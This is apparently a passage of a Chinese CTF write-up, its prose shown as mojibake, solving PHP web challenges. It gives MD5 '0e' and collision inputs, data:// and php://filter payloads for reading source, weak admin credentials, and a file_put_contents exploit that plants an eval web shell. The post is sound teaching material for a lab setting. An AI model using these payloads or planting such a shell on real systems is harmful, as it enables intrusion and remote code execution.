<p>a=[]=1&amp;<span class="hexo-wm">ğ˜€â€‹Â³â…´ï½…ï½.<span class="hexo-wm">sâ€‹3veğ˜¯â€¤â€ŒÑ•ğ¢â€Œâ€tğ˜¦â€‹â€‹</span>â€â€Œğ’”ğ˜ªâ€Œï»¿ï½”ğï»¿</span>b=[]=2</p>
</blockquote>
<h3 id="1-2-åˆ©ç”¨å¼±ç±»å‹ç‰¹æ€§0eç»•è¿‡"><a href="#1-2-åˆ©ç”¨å¼±ç±»å‹ç‰¹æ€§0eç»•è¿‡" class="headerlink" title="1.2 åˆ©ç”¨å¼±ç±»å‹ç‰¹æ€§0eç»•è¿‡"></a>1.2 åˆ©ç”¨å¼±ç±»å‹ç‰¹æ€§0eç»•è¿‡</h3><blockquote>
<p>ç”±äºPHPçš„å¼±ç±»å‹ç‰¹æ€§ï¼Œè‹¥ <code>md5</code> å‡½æ•°è¿”å›çš„å­—ç¬¦ä¸²ä»¥ <code>0e</code> å¼€å¤´ï¼Œä¼šè¢«PHPè¯†åˆ«ä¸ºç§‘å­¦<span class="hexo-wm">ğ˜´â€Â³ğ¯â„¯ğ˜¯âˆ™ï»¿â€‹ğ¬â…ˆâ€â€teâ€â€Œ</span>è®¡æ•°æ³•ï¼Œå°†å…¶å€¼è½¬åŒ–ä¸º0</p>
</blockquote>
<p>å› æ­¤åªéœ€è¦ <code>a</code> å’Œ <code>b</code> ä¸ç›¸åŒä¸”ç»è¿‡ <code>md5</code> åŠ å¯†åçš„å¯†æ–‡éƒ½ä»¥ <code>0e</code> å¼€å¤´å³å¯</p>
<p>å¸¸è§çš„ç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š</p>
<blockquote>
<ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
<li>s214587387a</li>
</ul>
</blockquote>
<p>åœ¨å…¶ä¸­ä»»æ„é€‰æ‹©å¹¶èµ‹ç»™ <code>a</code> &amp; <code>b</code> å³å¯</p>
<h3 id="1-3-ç›´æ¥ä½¿ç”¨md5ç¢°æ’"><a href="#1-3-ç›´æ¥ä½¿ç”¨md5ç¢°æ’" class="headerlink" title="1.3 ç›´æ¥ä½¿ç”¨md5ç¢°æ’"></a>1.3 ç›´æ¥ä½¿ç”¨md5ç¢°æ’</h3><blockquote>
<p>æ­¤æ–¹æ³•äº¦å¯ç”¨äºâ€<span class="hexo-wm">ğ¬â€‹3vâ„¯ï½âˆ™ï»¿Ñ•iï»¿ï½”eâ€Œ</span>===â€å¼ºç±»å‹ç¢°æ’ï¼Œ<span class="hexo-wm">ğ˜´ï»¿ï»¿â‘¶ğ˜·ğğ’Â·ï»¿ğ˜´ğ¢â€Œğ˜µï½…â€Œ</span>æ—¨åœ¨å¯»æ‰¾å«æœ‰ç›¸åŒmd5å€¼çš„ä¸åŒå­—ç¬¦ä¸²</p>
</blockquote>
<p>ç»æŸ¥æ‰¾åå¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ <code>a</code> &amp; <code>b </code>æ»¡è¶³æ¡ä»¶ï¼š</p>
<pre class="language-none"><code class="language-none">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
<h2 id="2-ç¬¬äºŒéƒ¨åˆ†"><a href="#2-ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="2. ç¬¬äºŒéƒ¨åˆ†"></a>2. ç¬¬äºŒéƒ¨åˆ†</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna run around and desert you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Never gonna make you cry'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna say goodbye'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>æ­¤å¤„åˆ¤æ–­æ˜¯å¦é€šè¿‡ <code>GET</code> æ–¹å¼ä¼ å…¥äº†arg <code>c</code> ï¼Œ</p>
<p>ç„¶åä½¿ç”¨ <code>file_get_contents</code> å‡½æ•°è¯»å– <code>c</code>ï¼Œ</p>
<p>å°†è¯»å–ç»“æœä¸ <code>Never gonna make you cry</code> æ¯”å¯¹</p>
<p>è‹¥æ¯”å¯¹å¤±è´¥åˆ™ç»ˆ<span class="hexo-wm">ğ¬ï»¿Â³veğ’â€¤â€â€Ñ•ğ˜ªâ€Œtâ„®â€‹ï»¿</span>æ­¢è¿è¡Œå¹¶æŠ›å‡º</p>
<blockquote>
<p>Never gonna <span class="hexo-wm">sï»¿â€‹Â³ğ¯ğğ§ï¼â€â€<span class="hexo-wm">ğ¬â€Œï»¿3ğ¯ğğ’ï¼â€ï»¿ğ’”iâ€Œâ€ï½”â„®â€‹</span>ğ˜€ğ˜ªâ€Œâ€‹ğ­eï»¿ï»¿</span>say goodbye</p>
</blockquote>
<p>ç”±äºæ­¤å¤„ç”¨åˆ°äº†<span class="hexo-wm">ğ¬â€Œï»¿3ğ¯â„¯ğ’ï¼ï»¿ï»¿êœ±ï½‰â€‹â€ï½”ğâ€â€Œ</span>æ–‡ä»¶è¯»å–å‡½æ•° <code>file_get_contents</code></p>
<p>å› æ­¤è€ƒè™‘ä½¿ç”¨ <code>data://</code> ä¼ªåè®®ç»•è¿‡</p>
<blockquote>
<p>data://text/plain,<span class="hexo-wm">sâ€ŒğŸ¯ğ¯â„¯ğ˜¯â€¢â€â€‹<span class="hexo-wm">ğ˜´â€Œâ€‹3ğ’—â„¯ï½âˆ™â€sğ¢â€Œâ€Œğ’•â„®â€‹ï»¿</span>ğ’”â…ˆï»¿ğ’•eâ€Œâ€Œ</span>(string)</p>
</blockquote>
<p>å› æ­¤å°†arg <code>c</code> èµ‹å€¼ä¸º <code>data://text/plain,Never gonna make you cry</code></p>
<h2 id="3-ç¬¬ä¸‰éƒ¨åˆ†"><a href="#3-ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="3. ç¬¬ä¸‰éƒ¨åˆ†"></a>3. ç¬¬ä¸‰éƒ¨åˆ†</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Never gonna tell a lie and hurt you'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>æœ€åä¸€å¤„ä»£ç å°†arg <code>d</code> çš„é»˜è®¤å€¼è®¾ç½®ä¸º <code>flag.php</code> ï¼Œæç¤ºæˆ‘ä»¬åœ¨ <code>flag.php</code> ä¸­å¯»æ‰¾çº¿ç´¢</p>
<blockquote>
<p>ä½†æ˜¯æˆ‘ä»¬å¦‚æœç›´æ¥å°†è¿™ç§å«æœ‰PHPä»£ç çš„æ–‡ä»¶çš„æ–‡ä»¶åä¼ å…¥<code>include</code>å‡½æ•°ï¼Œ<br>å°±ä¼šç”±äºPHPä»£ç è¢«æ‰§è¡Œ<span class="hexo-wm">ğ˜´â€‹ğŸ¯ğ˜·eï½â€¢<span class="hexo-wm">ğ¬â€‹3ğ¯â„¯ğ˜¯âˆ™â€Œâ€êœ±iâ€Œğ­ğâ€â€</span>â€â€Œğ˜´ğ¢â€‹â€‹ğ­eâ€Œ</span>è€Œæ— æ³•é€šè¿‡å¯è§†æ–‡æœ¬çš„å½¢å¼æ³„éœ²</p>
</blockquote>
<p>å› æ­¤æƒ³åˆ°ä½¿ç”¨PHPä¼ªåè®®çš„ <code>Filter</code> ï¼ŒæŠŠä»£ç å†…å®¹ç»è¿‡ba<span class="hexo-wm">ğ˜´â€‹â€Â³â…´ï½…ğ§.ï»¿â€ğ˜€iâ€Œâ€‹tï½…ï»¿â€‹</span>se64åŠ å¯†åå†è¿›è¡Œè¾“å‡º</p>
<p><code>d=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>å¾—åˆ°è¾“å‡ºå†…å®¹å¦‚ä¸‹</p>
<pre class="language-none"><code class="language-none">PD9waHAKJGZsYWcgPSAkX0VOVlsnRkxBRyddID8/ICdTcGlyaXR7ZmFrZS1mbGFnLXF3cX0nOwpmaWxlX3B1dF9jb250ZW50cygnc3Bpcml0ZmxhZ3F3cScsICRmbGFnKTsK</code></pre>
<p>ç»è¿‡ <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64åœ¨<span class="hexo-wm">ğ˜€â€‹ğŸ¯ğ¯â„®ï½.â€Œêœ±ï½‰â€â€Œtğ˜¦â€Œâ€</span>çº¿åŠ è§£å¯†å·¥å…·</a> è§£å¯†åå¾—åˆ°</p>
<p><img src="image-6.png" alt="image-6.png"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_ENV</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'Spirit{fake-flag-qwq}'</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'spiritflagqwq'</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
<p>å‘ç° <code>flag</code> ä¿¡æ¯è¢«å†™å…¥äº† <code>spiritflagqwq</code> æ–‡ä»¶ä¸­</p>
<h3 id="3-1-å°ç›²ç‚¹"><a href="#3-1-å°ç›²ç‚¹" class="headerlink" title="3.1 å°ç›²ç‚¹"></a>3.1 å°ç›²ç‚¹</h3><p>ç„¶è€Œåšé¢˜è¿‡ç¨‹ä¸­å‘<span class="hexo-wm">êœ±â€â€3ğ¯ğï½ï¼â€Œêœ±iï»¿â€Œğ˜µï½…â€‹</span>ç°å‡ºé¢˜äººå¹¶æ²¡æœ‰é¢„å…ˆå°†<code>flag</code>ä¿¡æ¯å†™å…¥<code>spiritflagqwq</code>æ–‡ä»¶ä¸­ï¼Œ<br>å› æ­¤éœ€è¦å…ˆæ‰§è¡Œä¸€æ¬¡ <code>flag.php</code> å°†flagä¿¡æ¯å†™å…¥ <code>spiritflagqwq</code> æ–‡ä»¶ä¸­</p>
<blockquote>
<p>å¯ä»¥é€šè¿‡ä¸ä¼ å…¥arg <code>d</code>,ä½¿å¾—å…¶è¢«ç½®ä¸ºé»˜è®¤å€¼ <code>flag.php</code> æ¥ä½¿å¾— <code>flag.php</code> æ–‡ä»¶è¢«æ‰§è¡Œ</p>
</blockquote>
<p>æœ€åå°† arg <code>d</code> è®¾ç½®ä¸º <code>spiritflagqwq</code> æ¥è¯»å– <code>spiritflagqwq</code> æ–‡ä»¶</p>
<p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<pre class="language-none"><code class="language-none">U3Bpcml0ezFjODJlODRmLWNiOTctNDQ3Ni1iYTI5LTdmZDY2ODcxMGM3MH0=</code></pre>
<p>ç»è¿‡ <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64åœ¨çº¿åŠ è§£å¯†å·¥å…·</a> è§£å¯†åå¾—åˆ°<br><img src="image-7.png" alt="image-7.png"></p>
<blockquote>
<p>Spirit{1c82<span class="hexo-wm">sâ€‹3â…´eğ’â€¢â€Œâ€ŒÑ•ğ¢â€â€‹tï½…â€â€Œ</span>e84f-cb97-<span class="hexo-wm">sâ€Œâ‘¶â…´â„¯ï½âˆ™â€Œsiâ€â€Œğ­ï½…â€Œâ€Œ</span>4476-ba29-7fd668710c70}</p>
</blockquote>
<h1 id="ez-Web"><a href="#ez-Web" class="headerlink" title="ez_Web"></a>ez_Web</h1><p>æ¨¡ç‰ˆå¥—å¨ƒé¢˜</p>
<p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>Hint: fl<span class="hexo-wm">êœ±â€‹â€ğŸ¯ğ˜·ğ˜¦ğ’â€¢â€Œâ€Œğ˜´ï½‰â€Œï»¿tğ˜¦ï»¿â€</span>agåœ¨/flagé‡Œï½</p>
</blockquote>
<h2 id="1-ç¬¬ä¸€å±‚ï¼š301-Redirect"><a href="#1-ç¬¬ä¸€å±‚ï¼š301-Redirect" class="headerlink" title="1. ç¬¬ä¸€å±‚ï¼š301 Redirect"></a>1. ç¬¬ä¸€å±‚ï¼š301 Redirect</h2><p>æ‰“å¼€é¡µé¢åæ˜¾ç¤º403 Forbiddenï¼Œ<span class="hexo-wm">sâ€‹ï»¿ğŸ¯ğ˜·â„¯ğ’â€¢â€â€Œêœ±ï½‰â€Œtâ„®â€‹</span>æç¤ºé¡µé¢å…¥å£ä¸åœ¨è¿™é‡Œ</p>
<p><img src="image-8.png" alt="image-8.png"></p>
<p>ä½¿ç”¨dirsear<span class="hexo-wm">Ñ•ï»¿â‘¶ğ¯ï½…ğ’âˆ™â€ğ˜´iâ€ğ˜µğâ€Œ</span>chç›®å½•å·¥å…·æ‰«æ<br><img src="image-9.png" alt="image-9.png"></p>
<p>å‘ç°ä¸¤ä¸ªç›®å½•</p>
<pre class="language-none"><code class="language-none">200 - 382B - /index.html
200 -  19B - /test.php</code></pre>
<p>è®¿é—® <code>index.html</code></p>
<p>å‘ç°åˆæ˜¯ <code>301 Redirect</code></p>
<p>åŒ <code>Web - signin</code> å¯ä»¥ç”¨ <code>curl</code> æˆ– <code>burp suite</code> æ–¹æ³•</p>
<h3 id="1-1-curl-æ–¹æ³•"><a href="#1-1-curl-æ–¹æ³•" class="headerlink" title="1.1 curl æ–¹æ³•"></a>1.1 curl æ–¹æ³•</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/index.html</code></pre>
<h3 id="1-2-burp-suite-æ–¹æ³•"><a href="#1-2-burp-suite-æ–¹æ³•" class="headerlink" title="1.2 burp suite æ–¹æ³•"></a>1.2 burp suite æ–¹æ³•</h3><p><img src="image-10.png" alt="image-10.png"><br>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>æµ‹æµ‹ä½ çš„ç½‘é€Ÿ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'test.php'</span>
        <span class="token comment">//fffff_test.php</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>æç¤ºæˆ‘ä»¬åˆ° <code>fffff_test.php</code> ä¸­å»å¯»æ‰¾çº¿ç´¢</p>
<h2 id="2-ç¬¬äºŒå±‚ï¼šGET-ä¼ å‚"><a href="#2-ç¬¬äºŒå±‚ï¼šGET-ä¼ å‚" class="headerlink" title="2. ç¬¬äºŒå±‚ï¼šGET ä¼ å‚"></a>2. ç¬¬äºŒå±‚ï¼šGET ä¼ å‚</h2><p>è®¿é—® <code>fffff_test.php</code> è·å¾—å¦‚ä¸‹ä¿¡æ¯</p>
<pre class="language-none"><code class="language-none">ä»€ä¹ˆ!?ä½ è¿JQKéƒ½æ²¡æœ‰?ç»™æˆ‘ä¸€ä¸ªJQK,æˆ‘ç»™ä½ ä¸€ä¸ª789ã€‚</code></pre>
<p>æ ¹æ®ä¿¡æ¯æ„é€  <code>GET</code> ä¼ å‚ï¼š<code>?JQK=789</code></p>
<h2 id="3-ç¬¬ä¸‰å±‚ï¼šfile-get-contents-åˆ©ç”¨"><a href="#3-ç¬¬ä¸‰å±‚ï¼šfile-get-contents-åˆ©ç”¨" class="headerlink" title="3. ç¬¬ä¸‰å±‚ï¼šfile_get_contents() åˆ©ç”¨"></a>3. ç¬¬ä¸‰å±‚ï¼šfile_get_contents() åˆ©ç”¨</h2><p>ä¼ å‚åè¿›å…¥ <code>/fffFfff1ag.php</code> ï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç </p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span></code></pre>
<p>ç”±äºSpiritçš„flagæ²¡æœ‰flagæ ‡è¯†ï¼Œå› æ­¤æ— éœ€ç»•è¿‡PHPçš„ <code>preg_match</code></p>
<p>ç›´æ¥ä¼ å…¥ <code>file=/flag</code> å³å¯</p>
<h3 id="3-1-PS-preg-match-ç»•è¿‡"><a href="#3-1-PS-preg-match-ç»•è¿‡" class="headerlink" title="3.1 PS: preg_match ç»•è¿‡"></a>3.1 PS: preg_match ç»•è¿‡</h3><p>preg_match å¯¹ $content <span class="hexo-wm">êœ±â€3vï½…n.â€â€Œğ’”iâ€ğ’•â„®â€‹ï»¿</span>å†…å®¹çš„è¿‡æ»¤å¯é€šè¿‡PHPçš„ <code>Filter</code> ä¼ªåè®®ç»•è¿‡</p>
<pre class="language-none"><code class="language-none">php://filter/read=convert.base64-encode/resource=/flag</code></pre>
<p>é€šè¿‡å°†flagå†…å®¹ä½¿ç”¨base64å¯†æ–‡è¾“å‡ºï¼Œå¯æœ‰æ•ˆè¿‡æ»¤ <code>preg_match</code> å¯¹flagåŒ…å«çš„æ£€æµ‹</p>
<p>åªéœ€å°†å¯†æ–‡ç»è¿‡ <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64åœ¨çº¿åŠ è§£å¯†å·¥å…·</a> è§£å¯†å³å¯è·å¾—flag</p>
<p>å¾—åˆ°flag</p>
<pre class="language-none"><code class="language-none">Spirit{eec1fb16-5aa0-4ab2-95c3-dbf3b582be28}</code></pre>
<p>è‡³æ­¤ï¼Œä¸‰å±‚å¥—å¨ƒå…¨éƒ¨ç»“æŸ</p>
<h1 id="ez-Web2"><a href="#ez-Web2" class="headerlink" title="ez_Web2"></a>ez_Web2</h1><p><del>åˆæ˜¯å¥—å¨ƒé¢˜(è¯¯)</del></p>
<p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>Hint: robots</p>
</blockquote>
<h2 id="1-ç¬¬ä¸€å±‚ï¼šrobots-æ³„éœ²"><a href="#1-ç¬¬ä¸€å±‚ï¼šrobots-æ³„éœ²" class="headerlink" title="1. ç¬¬ä¸€å±‚ï¼šrobots æ³„éœ²"></a>1. ç¬¬ä¸€å±‚ï¼šrobots æ³„éœ²</h2><p>æ‰“å¼€é¡µé¢åæ˜¾ç¤º</p>
<pre class="language-none"><code class="language-none">ç³»ç»Ÿç»´æŠ¤ä¸­ï¼Œæš‚æœªå¼€æ”¾</code></pre>
<p>æ ¹æ® Hint<span class="hexo-wm">ğ¬â€‹â‘¶â…´â„¯ğ§â€¤â€â€ğ’”ï½‰â€‹ï»¿ï½”ï½…â€Œ</span> å†…å®¹è®¿é—® <code>/robots.txt</code> ï¼Œå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<pre class="language-none"><code class="language-none">User-Agent: *
Disallow: login.php</code></pre>
<h2 id="2-ç¬¬äºŒå±‚ï¼šå¼±å¯†ç çˆ†ç ´"><a href="#2-ç¬¬äºŒå±‚ï¼šå¼±å¯†ç çˆ†ç ´" class="headerlink" title="2. ç¬¬äºŒå±‚ï¼šå¼±å¯†ç çˆ†ç ´"></a>2. ç¬¬äºŒå±‚ï¼šå¼±å¯†ç çˆ†ç ´</h2><p>æ ¹æ®æç¤ºè®¿é—® <code>login.php</code></p>
<p><img src="image-11.png" alt="image-11.png"></p>
<p>å‘ç°ä¸€ä¸ªç™»å½•æ¡†ï¼Œ<span class="hexo-wm">êœ±â€‹â‘¶ğ˜·ğnâ€¤â€‹ğ˜´ğ¢ï»¿ğ­ğ˜¦â€Œâ€</span>è¿›è¡Œå¼±å¯†ç å°è¯•</p>
<p>å°è¯•åå‘ç°</p>
<blockquote>
<p>ç”¨æˆ·åï¼šadmin<br>å¯†ç ï¼š123456</p>
</blockquote>
<h2 id="3-ç¬¬ä¸‰å±‚ï¼šfile-put-contents-åˆ©ç”¨"><a href="#3-ç¬¬ä¸‰å±‚ï¼šfile-put-contents-åˆ©ç”¨" class="headerlink" title="3. ç¬¬ä¸‰å±‚ï¼šfile_put_contents() åˆ©ç”¨"></a>3. ç¬¬ä¸‰å±‚ï¼šfile_put_contents() åˆ©ç”¨</h2><p>ç™»å½•åè¿”å›å¦‚ä¸‹PHPä»£ç </p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'è¯·å…ˆç™»å½•'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span></span></code></pre>
<p>è§‚å¯Ÿåˆ°å‡½æ•° <code>file_put_contents</code> å¯æ§ï¼Œè€ƒè™‘ä½¿ç”¨ <span class="hexo-wm">ğ’”â€Œâ€Œâ‘¶vğğ’Â·â€Œğ¬iâ€Œâ€‹ï½”ğï»¿</span>Web Shell</p>
<p>ç”±äºæ­¤å¤„ <code>str_replace</code> çš„è°ƒç”¨æ²¡æœ‰æŠŠè¿”å›å€¼èµ‹å›ç»™ <code>data</code> ï¼Œæ‰€ä»¥æ­¤è¡Œä»£ç æ— æ•ˆ</p>
<p>æ„é€ å‚æ•°å¦‚ä¸‹( <span class="hexo-wm">Ñ•â€‹â‘¶ğ˜·eğ˜¯ï¼â€‹Ñ•ï½‰â€ï½”â„®ï»¿â€Œ</span>æ³¨æ„ä½¿ç”¨POSTæ–¹æ³•ä¼ å‚ )ï¼š</p>
<pre class="language-none"><code class="language-none">?filename=shell.php&amp;data=&lt;?php eval(@$_POST['shell']); ?&gt;</code></pre>
<h3 id="3-1-HackBar"><a href="#3-1-HackBar" class="headerlink" title="3.1 HackBar"></a>3.1 HackBar</h3><p>ç™»å½•è¿‡åæ— éœ€æºå¸¦ <code>Cookies</code></p>
<p><img src="image-12.png" alt="image-12.png"></p>
<h3 id="3-2-curl"><a href="#3-2-curl" class="headerlink" title="3.2 curl"></a>3.2 curl</h3><p>æ³¨æ„æºå¸¦ç™»å½•è¿‡åçš„PHP<span class="hexo-wm">sï»¿â€Œâ‘¶ğ’—ğğ§.â€sğ˜ªâ€ï»¿ï½”ğ˜¦ï»¿â€Œ</span>SESSIDä½œä¸ºCookies</p>
